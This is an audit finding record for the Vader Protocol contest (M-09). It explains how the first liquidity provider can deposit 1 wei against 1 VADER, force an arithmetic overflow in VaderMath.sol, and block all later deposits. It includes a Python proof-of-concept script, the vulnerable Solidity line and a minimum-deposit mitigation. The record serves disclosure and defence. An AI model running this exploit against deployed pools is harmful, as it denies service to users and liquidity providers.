---
# Core Classification
protocol: Vader Protocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 1028
audit_firm: Code4rena
contest_link: https://code4rena.com/contests/2021-11-vader-protocol-contest
source_link: https://code4rena.com/reports/2021-11-vader
github_link: https://github.com/code-423n4/2021-11-vader-findings/issues/109

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - oracle
  - liquid_staking
  - bridge
  - cdp
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - jonah1005
---

## Vulnerability Title

[M-09] The first lp provider can destroy the pool

### Overview


The bug report is about a vulnerability that can be exploited to cause a Denial of Service (DoS) on the system. The vulnerability occurs when the first liquidity provider sets the pool's rate to an extreme value, which prevents anyone from being able to deposit to the pool. This vulnerability is considered medium-risk. A proof of concept is provided that shows how the attack can be carried out. The code shows how a malicious attacker can back-run the `setTokenSupport` and set the pool's price to the extreme. This is caused by an overflow in the operation due to the scale of the total supply being (10**18)^2. The recommended mitigation step is to set a minimum deposit amount for the first liquidity provider.

### Original Finding Content

_Submitted by jonah1005_

#### Impact

First lp provider received liquidity amount same as the nativeDeposit amount and decides the rate. If the first lp sets the pool's rate to an extreme value no one can deposit to the pool afterward. (please refer to the proof of concept section)

A malicious attacker can DOS the system by back-running the `setTokenSupport` and setting the pools' price to the extreme.
I consider this is a medium-risk issue.

#### Proof of Concept

```python

    deposit_amount = 1000 * 10**18
    get_token(dai, user, deposit_amount*3)
    get_token(vader, user, deposit_amount*3)
    dai.functions.approve(pool.address, deposit_amount*3).transact()
    link.functions.approve(pool.address, deposit_amount*3).transact()


    # deposit_amount = 1000 * 10**18

    # # first deposit 1 wei Dai and 1 vader to the pool
    router.functions.addLiquidity(dai.address, vader.address, 1, 10**18, user, 10**18).transact()
    print('received liquidity', pool.functions.positions(0).call()[2])
    # output log:
    # 1000000000000000000

    # normally deposit to the pool
    router.functions.addLiquidity(dai.address, vader.address, deposit_amount, deposit_amount, user, 10**18).transact()
    print('received liquidity', pool.functions.positions(1).call()[2])

    # output log:
    # 500000000000000000500000000000000000000

    # no one can deposit to the pool now
    # there would be revert

    router.functions.addLiquidity(dai.address, vader.address, 1, deposit_amount, user, 10**18).transact()

```

[VaderMath.sol#L42](https://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/math/VaderMath.sol#L42)

```solidity
    ((totalPoolUnits * poolUnitFactor) / denominator) * slip
```

Since the scale of the total supply is (10\*\*18)^2, the operation would overflow.

#### Tools Used

None

#### Recommended Mitigation Steps

Set a minimum deposit amount (both asset amount and native amount) for the first lp provider.

**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/109)**



### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Vader Protocol |
| Report Date | N/A |
| Finders | jonah1005 |

### Source Links

- **Source**: https://code4rena.com/reports/2021-11-vader
- **GitHub**: https://github.com/code-423n4/2021-11-vader-findings/issues/109
- **Contest**: https://code4rena.com/contests/2021-11-vader-protocol-contest

### Keywords for Search

`vulnerability`

